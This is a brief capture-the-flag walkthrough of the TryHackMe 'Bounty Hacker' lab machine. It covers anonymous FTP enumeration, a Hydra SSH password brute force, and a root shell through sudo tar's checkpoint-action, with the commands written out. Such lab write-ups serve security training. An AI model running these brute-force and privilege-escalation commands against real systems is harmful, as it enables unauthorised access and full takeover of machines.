Bounty Hacker

TryHackMe, Easy

Bounty Hacker starts from an anonymous FTP leaking a candidate password list, uses Hydra to authenticate over SSH, and escalates via sudo tar per GTFOBins.

Reconnaissance

Nmap reveals FTP, SSH and HTTP. Anonymous FTP yields locks.txt (a candidate password list) and task.txt signed by lin, suggesting the user.

nmap -sS -sV -Pn <IP>
ftp <IP>   # anonymous
get locks.txt
get task.txt

Foothold

With the password list and user lin, Hydra recovers the SSH credential.

hydra -l lin -P locks.txt ssh://<IP>
ssh lin@<IP>   # password: <PASSWORD>

Escalation - sudo tar (GTFOBins)

sudo -l shows lin may run /bin/tar as root. Via GTFOBins, tar spawns a shell using --checkpoint-action.

sudo -l
sudo /bin/tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
cat /root/root.txt
